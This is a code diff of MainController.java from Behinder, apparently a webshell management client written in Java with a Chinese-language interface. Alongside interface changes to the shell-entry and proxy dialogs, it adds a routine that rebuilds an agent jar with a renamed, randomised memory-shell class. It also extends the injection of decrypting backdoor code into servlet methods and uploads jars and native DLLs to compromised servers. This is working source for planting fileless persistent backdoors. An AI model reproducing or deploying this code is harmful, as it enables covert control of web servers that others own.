@@ -1,6 +1,7 @@
 package net.rebeyond.behinder.ui.controller;
 
 import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.net.Authenticator;
 import java.net.InetSocketAddress;
@@ -19,11 +20,16 @@ import java.util.List;
 import java.util.Map;
 import java.util.Optional;
 import java.util.Random;
+import java.util.jar.JarEntry;
 import java.util.regex.Pattern;
 import java.util.stream.Collectors;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipInputStream;
+import java.util.zip.ZipOutputStream;
 import javafx.application.Platform;
 import javafx.beans.property.SimpleStringProperty;
 import javafx.beans.property.StringProperty;
+import javafx.beans.value.ObservableValue;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableList;
 import javafx.fxml.FXML;
@@ -71,6 +77,7 @@ import javassist.CtMethod;
 import javassist.NotFoundException;
 import net.rebeyond.behinder.core.Constants;
 import net.rebeyond.behinder.core.ICrypt;
+import net.rebeyond.behinder.core.Params;
 import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.dao.ShellManager;
 import net.rebeyond.behinder.dao.TransProtocolDao;
@@ -143,7 +150,6 @@ public class MainController {
          this.shellManager = new ShellManager();
          this.transProtocolDao = new TransProtocolDao();
       } catch (Exception var2) {
-         var2.printStackTrace();
          this.showErrorMessage("错误", "数据库文件丢失");
          System.exit(0);
       }
@@ -159,7 +165,6 @@ public class MainController {
          this.initMemshellTargetClassMap();
          this.loadProxy();
       } catch (Exception var2) {
-         var2.printStackTrace();
       }
 
    }
@@ -221,12 +226,12 @@ public class MainController {
          enableRadio.setToggleGroup(statusGroup);
          disableRadio.setToggleGroup(statusGroup);
          HBox statusHbox = new HBox();
-         statusHbox.setSpacing(10.0D);
+         statusHbox.setSpacing(10.0);
          statusHbox.getChildren().add(enableRadio);
          statusHbox.getChildren().add(disableRadio);
          GridPane proxyGridPane = new GridPane();
-         proxyGridPane.setVgap(15.0D);
-         proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
+         proxyGridPane.setVgap(15.0);
+         proxyGridPane.setPadding(new Insets(20.0, 20.0, 0.0, 10.0));
          Label typeLabel = new Label("类型：");
          ComboBox typeCombo = new ComboBox();
          typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
@@ -296,10 +301,10 @@ public class MainController {
                if (!userNameText.getText().trim().equals("")) {
                   final String proxyUser = userNameText.getText().trim();
                   type = passwordText.getText();
-                  String finalType = type;
+                  final String finaltype = type;
                   Authenticator.setDefault(new Authenticator() {
                      public PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(proxyUser, finalType.toCharArray());
+                        return new PasswordAuthentication(proxyUser, finaltype.toCharArray());
                      }
                   });
                } else {
@@ -340,7 +345,7 @@ public class MainController {
          proxyGridPane.add(passwordLabel, 0, 5);
          proxyGridPane.add(passwordText, 1, 5);
          HBox buttonBox = new HBox();
-         buttonBox.setSpacing(20.0D);
+         buttonBox.setSpacing(20.0);
          buttonBox.setAlignment(Pos.CENTER);
          buttonBox.getChildren().add(cancelBtn);
          buttonBox.getChildren().add(saveBtn);
@@ -465,10 +470,12 @@ public class MainController {
             Stage stage = new Stage();
             stage.setTitle("传输协议配置");
             stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
-            stage.setScene(new Scene(transProtocolPane));
+            Scene scene = new Scene(transProtocolPane);
+            scene.getRoot().setStyle("-fx-font-family: 'Arial'");
+            stage.setScene(scene);
             stage.show();
-         } catch (Exception var6) {
-            var6.printStackTrace();
+         } catch (Exception var7) {
+            var7.printStackTrace();
          }
 
       });
@@ -574,13 +581,61 @@ public class MainController {
          }).collect(Collectors.toList());
          CtMethod ctMethod = targetClass.getDeclaredMethod(methodName, (CtClass[])paramClasses.toArray(new CtClass[paramClasses.size()]));
          ICrypt cryptor = shellService.getCryptor();
-         ctMethod.insertBefore(String.format(Constants.shellCodeWithDecrypt, path, Base64.getEncoder().encodeToString(cryptor.getDecodeClsBytes()), "Decrypt"));
+         ctMethod.insertBefore(String.format(className.startsWith("jakarta.") ? Constants.shellCodeWithDecrypt.replace("javax.servlet.", "jakarta.servlet.") : Constants.shellCodeWithDecrypt, path, Base64.getEncoder().encodeToString(cryptor.getDecodeClsBytes()), "Decrypt"));
          targetClass.detach();
          byte[] hackedClass = targetClass.toBytecode();
          JSONObject resObj = shellService.injectAgentNoFileMemShell(className, Base64.getEncoder().encodeToString(hackedClass), isAntiAgent);
          System.out.println(resObj);
       }
 
+   }
+
+   private byte[] personalizedAgentJar(String jarPath, String path, String decryptClassStr, String decryptName) throws Exception {
+      Map params = new HashMap();
+      params.put("path", path);
+      params.put("decryptClassStr", decryptClassStr);
+      params.put("decryptName", decryptName);
+      params.put("shellCode", Constants.shellCodeWithDecrypt);
+      String inJarFilePath = "net/rebeyond/behinder/payload/java/MemShell.class";
+      String oldMemShellClsName = "net/rebeyond/behinder/payload/java/MemShell";
+      String newMemShellClsName = Utils.getRandomClassName(oldMemShellClsName);
+      byte[] entryBytes = Params.getParamedClass((byte[])Utils.getResourceData("net/rebeyond/behinder/resource/tools/MemShell.class"), (Map)params, (String)newMemShellClsName);
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      ZipOutputStream zipOutputStream = new ZipOutputStream(bos);
+      ZipInputStream zipInputStream = new ZipInputStream(new ByteArrayInputStream(Utils.getResourceData(jarPath)));
+
+      for(ZipEntry entry = zipInputStream.getNextEntry(); entry != null; entry = zipInputStream.getNextEntry()) {
+         if (entry.getName().equals(inJarFilePath)) {
+            zipOutputStream.putNextEntry(new ZipEntry(newMemShellClsName + ".class"));
+            zipOutputStream.write(entryBytes);
+            zipOutputStream.closeEntry();
+         } else if (entry.getName().equals("META-INF/MANIFEST.MF")) {
+            zipOutputStream.putNextEntry(new JarEntry(entry.getName()));
+            ByteArrayOutputStream contentBos = new ByteArrayOutputStream();
+            byte[] content = new byte[(int)entry.getSize()];
+
+            for(int length = zipInputStream.read(content); length > 0; length = zipInputStream.read(content)) {
+               contentBos.write(content, 0, length);
+            }
+
+            byte[] contentBytes = contentBos.toByteArray();
+            contentBytes = Utils.replaceBytes(contentBytes, oldMemShellClsName.replace("/", ".").getBytes(), newMemShellClsName.replace("/", ".").getBytes());
+            zipOutputStream.write(contentBytes);
+            zipOutputStream.closeEntry();
+         } else {
+            zipOutputStream.putNextEntry(new JarEntry(entry.getName()));
+            byte[] content = new byte[(int)entry.getSize()];
+
+            for(int length = zipInputStream.read(content); length > 0; length = zipInputStream.read(content)) {
+               zipOutputStream.write(content, 0, length);
+            }
+
+            zipOutputStream.closeEntry();
+         }
+      }
+
+      zipOutputStream.close();
+      return bos.toByteArray();
    }
 
    private void injectAgent(ShellService shellService, int osType, String path, boolean isAntiAgent) throws Exception {
@@ -591,7 +646,10 @@ public class MainController {
          libPath = "/tmp/" + libPath;
       }
 
-      shellService.uploadFile(libPath, Utils.getResourceData("net/rebeyond/behinder/resource/tools/tools_" + osType + ".jar"), true);
+      String jarPath = "net/rebeyond/behinder/resource/tools/tools_" + osType + ".jar";
+      ICrypt cryptor = shellService.getCryptor();
+      byte[] personalizedJarBytes = this.personalizedAgentJar(jarPath, path, Base64.getEncoder().encodeToString(cryptor.getDecodeClsBytes()), "Decrypt");
+      shellService.uploadFile(libPath, personalizedJarBytes, true);
       shellService.loadJar(libPath);
       shellService.injectAgentMemShell(libPath, path, Utils.getKey("rebeyond"), isAntiAgent);
       if (osType == Constants.OS_TYPE_WINDOWS) {
@@ -600,7 +658,7 @@ public class MainController {
             String arch = (new String(Base64.getDecoder().decode(basicInfoMap.getString("arch")), "UTF-8")).toLowerCase();
             String remoteUploadPath = "c:/windows/temp/" + Utils.getRandomString((new Random()).nextInt(10)) + ".log";
             byte[] nativeLibraryFileContent;
-            if (arch.toString().indexOf("64") >= 0) {
+            if (arch.indexOf("64") >= 0) {
                nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x64.dll");
                shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
                shellService.freeFile(remoteUploadPath, libPath);
@@ -619,8 +677,8 @@ public class MainController {
 
                shellService.deleteFile(remoteUploadPath);
             }
-         } catch (Exception var12) {
-            var12.printStackTrace();
+         } catch (Exception var16) {
+            var16.printStackTrace();
          }
       }
 
@@ -665,16 +723,16 @@ public class MainController {
       ObservableList tcs = this.shellListTable.getColumns();
 
       for(int i = 1; i < tcs.size(); ++i) {
-         int j = i - 1;
+         final int j = i - 1;
          ((TableColumn)tcs.get(i)).setCellValueFactory((data) -> {
-            //return (StringProperty)((List)data.getValue()).get(j);
-            return (StringProperty)((List)((TableColumn.CellDataFeatures)data).getValue()).get(j);
+            //return (ObservableValue)((List)data.getValue()).get(j);
+            return (StringProperty) ((List) ((TableColumn.CellDataFeatures) data).getValue()).get(j);
          });
       }
 
       this.idCol.setCellFactory((col) -> {
          TableCell cell = new TableCell() {
-            public void updateItem(Object item, boolean empty) {
+            public void updateItem(String item, boolean empty) {
                super.updateItem(item, empty);
                this.setText((String)null);
                this.setGraphic((Node)null);
@@ -690,7 +748,7 @@ public class MainController {
       });
       this.statusCol.setCellFactory((col) -> {
          TableCell cell = new TableCell() {
-            public void updateItem(Object item, boolean empty) {
+            public void updateItem(String item, boolean empty) {
                super.updateItem(item, empty);
                if (empty) {
                   this.setGraphic((Node)null);
@@ -721,10 +779,7 @@ public class MainController {
                         this.setAlignment(Pos.CENTER);
                      } catch (Exception var7) {
                         var7.printStackTrace();
-                        if(item==null){
-                           item = "";
-                        }
-                        this.setText(item.toString());
+                        this.setText(item);
                      }
 
                   }
@@ -800,6 +855,96 @@ public class MainController {
       ComboBox shellType = new ComboBox();
       ObservableList typeList = FXCollections.observableArrayList(new String[]{"jsp", "php", "aspx", "asp"});
       shellType.setItems(typeList);
+      ToggleGroup transTypeGroup = new ToggleGroup();
+      RadioButton legacyRadio = new RadioButton("默认");
+      legacyRadio.setUserData("legacy");
+      RadioButton customizedRadio = new RadioButton("自定义");
+      customizedRadio.setUserData("customized");
+      legacyRadio.setToggleGroup(transTypeGroup);
+      customizedRadio.setToggleGroup(transTypeGroup);
+      Label typeTipLabel = new Label();
+      typeTipLabel.setText("* 默认：使用冰蝎v3.0内置加密模式");
+      typeTipLabel.setTextFill(Color.RED);
+      HBox transTypeHbox = new HBox();
+      transTypeHbox.setSpacing(10.0);
+      transTypeHbox.getChildren().add(legacyRadio);
+      transTypeHbox.getChildren().add(customizedRadio);
+      transTypeHbox.getChildren().add(typeTipLabel);
+      ComboBox shellCatagory = new ComboBox();
+
+      JSONObject shellObj;
+      try {
+         JSONArray catagoryArr = this.shellManager.listCatagory();
+         ObservableList catagoryList = FXCollections.observableArrayList();
+
+         for(int i = 0; i < catagoryArr.length(); ++i) {
+            shellObj = catagoryArr.getJSONObject(i);
+            catagoryList.add(shellObj.getString("name"));
+         }
+
+         shellCatagory.setItems(catagoryList);
+         shellCatagory.getSelectionModel().select(0);
+      } catch (Exception var23) {
+         var23.printStackTrace();
+      }
+
+      TextArea header = new TextArea();
+      header.setPromptText("请输入自定义请求头Key:value对，一行一个，如：User-Agent: Just_For_Fun");
+      header.setPrefHeight(100.0);
+      TextArea comment = new TextArea();
+      comment.setPromptText("请输入备注信息");
+      comment.setPrefHeight(50.0);
+      GridPane vpsInfoPane = new GridPane();
+      GridPane.setMargin(vpsInfoPane, new Insets(20.0, 0.0, 0.0, 0.0));
+      vpsInfoPane.setVgap(10.0);
+      vpsInfoPane.setMaxWidth(Double.MAX_VALUE);
+      vpsInfoPane.add(new Label("URL："), 0, 0);
+      vpsInfoPane.add(urlText, 1, 0);
+      vpsInfoPane.add(new Label("脚本类型："), 0, 1);
+      vpsInfoPane.add(shellType, 1, 1);
+      vpsInfoPane.add(new Label("加密类型："), 0, 2);
+      vpsInfoPane.add(transTypeHbox, 1, 2);
+      vpsInfoPane.add(new Label("连接密码："), 0, 3);
+      vpsInfoPane.add(new Label("分类："), 0, 4);
+      vpsInfoPane.add(shellCatagory, 1, 4);
+      vpsInfoPane.add(new Label("自定义请求头："), 0, 5);
+      vpsInfoPane.add(header, 1, 5);
+      vpsInfoPane.add(new Label("备注："), 0, 6);
+      vpsInfoPane.add(comment, 1, 6);
+      transTypeGroup.selectedToggleProperty().addListener((obs, ov, newValue) -> {
+         if (newValue.getUserData().equals("legacy")) {
+            typeTipLabel.setText("* 默认：使用冰蝎v3.0内置加密模式");
+            ((Label)vpsInfoPane.getChildren().get(6)).setText("连接密码：");
+            vpsInfoPane.getChildren().remove(this.transProtocolCombo);
+            vpsInfoPane.add(passText, 1, 3);
+         } else if (newValue.getUserData().equals("customized")) {
+            typeTipLabel.setText("* 自定义：使用自定义传输协议进行加解密");
+            ((Label)vpsInfoPane.getChildren().get(6)).setText("传输协议：");
+            vpsInfoPane.getChildren().remove(passText);
+            vpsInfoPane.add(this.transProtocolCombo, 1, 3);
+         }
+
+      });
+      if (shellID != -1) {
+         shellObj = this.shellManager.findShell(shellID);
+         if (shellObj.getInt("transProtocolId") < 0) {
+            transTypeGroup.selectToggle(legacyRadio);
+            passText.setText(shellObj.getString("password"));
+         } else {
+            transTypeGroup.selectToggle(customizedRadio);
+            TransProtocol transProtocol = this.transProtocolDao.findTransProtocolById(shellObj.getInt("transProtocolId"));
+            this.transProtocolCombo.getSelectionModel().select(transProtocol.getName());
+         }
+
+         urlText.setText(shellObj.getString("url"));
+         shellType.setValue(shellObj.getString("type"));
+         shellCatagory.setValue(shellObj.getString("catagory"));
+         header.setText(shellObj.getString("headers"));
+         comment.setText(shellObj.getString("comment"));
+      } else {
+         transTypeGroup.selectToggle(legacyRadio);
+      }
+
       shellType.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
          try {
             List transProtocolList = this.transProtocolDao.findTransProtocolByType(newValue.toString());
@@ -828,29 +973,6 @@ public class MainController {
       });
       shellType.setOnAction((event) -> {
       });
-      ComboBox shellCatagory = new ComboBox();
-
-      try {
-         JSONArray catagoryArr = this.shellManager.listCatagory();
-         ObservableList catagoryList = FXCollections.observableArrayList();
-
-         for(int i = 0; i < catagoryArr.length(); ++i) {
-            JSONObject catagoryObj = catagoryArr.getJSONObject(i);
-            catagoryList.add(catagoryObj.getString("name"));
-         }
-
-         shellCatagory.setItems(catagoryList);
-         shellCatagory.getSelectionModel().select(0);
-      } catch (Exception var18) {
-         var18.printStackTrace();
-      }
-
-      TextArea header = new TextArea();
-      header.setPromptText("请输入自定义请求头Key:value对，一行一个，如：User-Agent: Just_For_Fun");
-      header.setPrefHeight(100.0D);
-      TextArea comment = new TextArea();
-      comment.setPromptText("请输入备注信息");
-      comment.setPrefHeight(50.0D);
       urlText.textProperty().addListener((observable, oldValue, newValue) -> {
          URL url;
          try {
@@ -871,36 +993,24 @@ public class MainController {
       Button saveBtn = new Button("保存");
       saveBtn.setDefaultButton(true);
       Button cancelBtn = new Button("取消");
-      GridPane vpsInfoPane = new GridPane();
-      GridPane.setMargin(vpsInfoPane, new Insets(20.0D, 0.0D, 0.0D, 0.0D));
-      vpsInfoPane.setVgap(10.0D);
-      vpsInfoPane.setMaxWidth(Double.MAX_VALUE);
-      vpsInfoPane.add(new Label("URL："), 0, 0);
-      vpsInfoPane.add(urlText, 1, 0);
-      vpsInfoPane.add(new Label("脚本类型："), 0, 1);
-      vpsInfoPane.add(shellType, 1, 1);
-      vpsInfoPane.add(new Label("传输协议："), 0, 2);
-      vpsInfoPane.add(this.transProtocolCombo, 1, 2);
-      vpsInfoPane.add(new Label("分类："), 0, 3);
-      vpsInfoPane.add(shellCatagory, 1, 3);
-      vpsInfoPane.add(new Label("自定义请求头："), 0, 4);
-      vpsInfoPane.add(header, 1, 4);
-      vpsInfoPane.add(new Label("备注："), 0, 5);
-      vpsInfoPane.add(comment, 1, 5);
       HBox buttonBox = new HBox();
-      buttonBox.setSpacing(20.0D);
+      buttonBox.setSpacing(20.0);
       buttonBox.getChildren().addAll(new Node[]{cancelBtn, saveBtn});
       buttonBox.setAlignment(Pos.BOTTOM_CENTER);
       vpsInfoPane.add(buttonBox, 0, 8);
       GridPane.setColumnSpan(buttonBox, 2);
       alert.getDialogPane().setContent(vpsInfoPane);
       if (shellID != -1) {
-         JSONObject shellObj = this.shellManager.findShell(shellID);
-         TransProtocol transProtocol = this.transProtocolDao.findTransProtocolById(shellObj.getInt("transProtocolId"));
+         shellObj = this.shellManager.findShell(shellID);
+         if (shellObj.getInt("transProtocolId") < 0) {
+            passText.setText(shellObj.getString("password"));
+         } else {
+            TransProtocol transProtocol = this.transProtocolDao.findTransProtocolById(shellObj.getInt("transProtocolId"));
+            this.transProtocolCombo.getSelectionModel().select(transProtocol.getName());
+         }
+
          urlText.setText(shellObj.getString("url"));
-         passText.setText(shellObj.getString("password"));
          shellType.setValue(shellObj.getString("type"));
-         this.transProtocolCombo.getSelectionModel().select(transProtocol.getName());
          shellCatagory.setValue(shellObj.getString("catagory"));
          header.setText(shellObj.getString("headers"));
          comment.setText(shellObj.getString("comment"));
@@ -908,9 +1018,20 @@ public class MainController {
 
       saveBtn.setOnAction((e) -> {
          String url = urlText.getText().trim();
-         String password = passText.getText();
-         int transProtocolId = (Integer)this.transProtocolCombo.getUserData();
-         if (this.checkUrl(url) && this.checkTransProtocolId(this.transProtocolCombo)) {
+         if (this.checkUrl(url)) {
+            String password = passText.getText();
+            int transProtocolId = -1;
+            if (!transTypeGroup.getSelectedToggle().getUserData().equals("legacy")) {
+               if (!this.checkTransProtocolId(this.transProtocolCombo)) {
+                  return;
+               }
+
+               transProtocolId = (Integer)this.transProtocolCombo.getUserData();
+               password = "";
+            } else if (!this.checkPassword(password)) {
+               return;
+            }
+
             String type = shellType.getValue().toString();
             String catagory = shellCatagory.getValue().toString();
             String commentStr = comment.getText();
@@ -921,15 +1042,15 @@ public class MainController {
 
             try {
                if (shellID == -1) {
-                  this.shellManager.addShell(url, transProtocolId, type, catagory, os, commentStr, headers, status, memType);
+                  this.shellManager.addShell(url, transProtocolId, type, password, catagory, os, commentStr, headers, status, memType);
                } else {
-                  this.shellManager.updateShell(shellID, url, transProtocolId, type, catagory, commentStr, headers);
+                  this.shellManager.updateShell(shellID, url, transProtocolId, type, password, catagory, commentStr, headers);
                }
 
                this.loadShellList();
                return;
-            } catch (Exception var24) {
-               this.showErrorMessage("保存失败", var24.getMessage());
+            } catch (Exception var25) {
+               this.showErrorMessage("保存失败", var25.getMessage());
             } finally {
                alert.getDialogPane().getScene().getWindow().hide();
             }
@@ -951,7 +1072,9 @@ public class MainController {
       stage.setTitle(url);
       stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
       stage.setUserData(url);
-      stage.setScene(new Scene(mainWindow));
+      Scene scene = new Scene(mainWindow);
+      scene.getRoot().setStyle("-fx-font-family: 'Arial'");
+      stage.setScene(scene);
       stage.setOnCloseRequest((e) -> {
          Runnable runner = () -> {
             List workerList = mainWindowController.getWorkList();
@@ -1083,7 +1206,7 @@ public class MainController {
             Utils.showErrorMessage("提示", "内存马植入目前仅支持Java");
          } else {
             Alert inputDialog = new Alert(AlertType.NONE);
-            inputDialog.setWidth(300.0D);
+            inputDialog.setWidth(300.0);
             inputDialog.setResizable(true);
             inputDialog.setTitle("注入内存马");
             Window window = inputDialog.getDialogPane().getScene().getWindow();
@@ -1091,8 +1214,8 @@ public class MainController {
                window.hide();
             });
             GridPane injectGridPane = new GridPane();
-            injectGridPane.setVgap(15.0D);
-            injectGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
+            injectGridPane.setVgap(15.0);
+            injectGridPane.setPadding(new Insets(20.0, 20.0, 0.0, 10.0));
             Label typeLabel = new Label("注入类型：");
             ComboBox typeCombo = new ComboBox();
             typeCombo.setItems(FXCollections.observableArrayList(new String[]{"AgentNoFile", "Agent"}));
@@ -1105,7 +1228,7 @@ public class MainController {
             Label pathLabel = new Label("注入路径：");
             pathLabel.setAlignment(Pos.CENTER_RIGHT);
             TextField pathText = new TextField();
-            pathText.setPrefWidth(300.0D);
+            pathText.setPrefWidth(300.0);
             pathText.setPromptText(String.format("支持正则表达式，如%smemshell.*", Utils.getContextPath(url)));
             pathText.focusedProperty().addListener((obs, oldVal, newVal) -> {
                if (pathText.getText().equals("")) {
@@ -1135,7 +1258,7 @@ public class MainController {
             injectGridPane.add(antiAgentCheckBox, 0, 2);
             injectGridPane.add(antiAgentMemo, 0, 3, 2, 1);
             HBox buttonBox = new HBox();
-            buttonBox.setSpacing(20.0D);
+            buttonBox.setSpacing(20.0);
             buttonBox.setAlignment(Pos.CENTER);
             buttonBox.getChildren().add(cancelBtn);
             buttonBox.getChildren().add(saveBtn);
@@ -1178,7 +1301,7 @@ public class MainController {
       int status = Integer.parseInt(Utils.getOrDefault(shellEntity, "status", Integer.TYPE));
       int memType = Integer.parseInt(Utils.getOrDefault(shellEntity, "memType", Integer.TYPE));
       int transProtocolId = Integer.parseInt(Utils.getOrDefault(shellEntity, "transProtocolId", Integer.TYPE));
-      this.shellManager.addShell(url, transProtocolId, type, catagory, os, comment, headers, status, memType);
+      this.shellManager.addShell(url, transProtocolId, type, password, catagory, os, comment, headers, status, memType);
    }
 
    private void loadShellList() throws Exception {
@@ -1240,7 +1363,7 @@ public class MainController {
       alert.setTitle(title);
       alert.setHeaderText("");
       alert.setContentText(msg);
-      alert.showAndWait();
+      alert.show();
    }
 
    private void initCatagoryMenu() {
@@ -1262,7 +1385,7 @@ public class MainController {
          panel.add(cataGoryNameTxt, 1, 0);
          panel.add(cataGoryCommentLable, 0, 1);
          panel.add(cataGoryCommentTxt, 1, 1);
-         panel.setVgap(20.0D);
+         panel.setVgap(20.0);
          alert.getDialogPane().setContent(panel);
          Optional result = alert.showAndWait();
          if (result.get() == ButtonType.OK) {
@@ -1355,7 +1478,7 @@ public class MainController {
                JSONObject shellEntity = shells.getJSONObject(i);
 
                try {
-                  int finalcount = count;
+                  final int finalcount = count;
                   Platform.runLater(() -> {
                      this.statusLabel.setText(String.format("正在导入%d/%d...", finalcount, shells.length()));
                   });
@@ -1368,8 +1491,8 @@ public class MainController {
                }
             }
 
-            int finalduplicateCount = duplicateCount;
-            int finalcount = count;
+            final int finalcount = count;
+            final int finalduplicateCount = duplicateCount;
             Platform.runLater(() -> {
                this.statusLabel.setText("导入完成。");
                Utils.showInfoMessage("提示", String.format("导入完成，共有%d条数据，%d条数据已存在，新导入%d数据，", shells.length(), finalduplicateCount, finalcount));
